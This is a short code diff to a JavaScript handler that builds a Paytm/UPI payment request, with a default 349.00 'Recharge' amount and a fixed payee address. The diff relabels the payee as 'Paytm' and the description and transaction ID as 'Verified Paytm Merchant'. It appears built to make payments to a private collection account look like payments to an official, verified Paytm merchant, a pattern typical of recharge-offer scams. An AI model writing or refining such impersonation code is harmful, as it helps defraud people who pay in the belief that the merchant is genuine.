@@ -2,11 +2,11 @@ export default function handler(req, res) {
   res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
   res.setHeader('Access-Control-Allow-Origin', '*');
 
-  const { amount = '349.00', text = 'Recharge', mobile = '9876543210', vpa = 'paytmqr6udcnp@ptys' } = req.query;
-  const name = 'Recharge Offers';
+  const { amount = '349.00', text = 'Verified Paytm Merchant', mobile = '9876543210', vpa = 'paytmqr6udcnp@ptys' } = req.query;
+  const name = 'Paytm';
 
   const amountInPaise = Math.round(parseFloat(amount) * 100);
-  const txn = 'TXN-' + Math.floor(100000000000 + Math.random() * 900000000000);
+  const txn = 'Verified Paytm Merchant';
 
   const payload = {
     p2pPaymentCheckoutParams: {
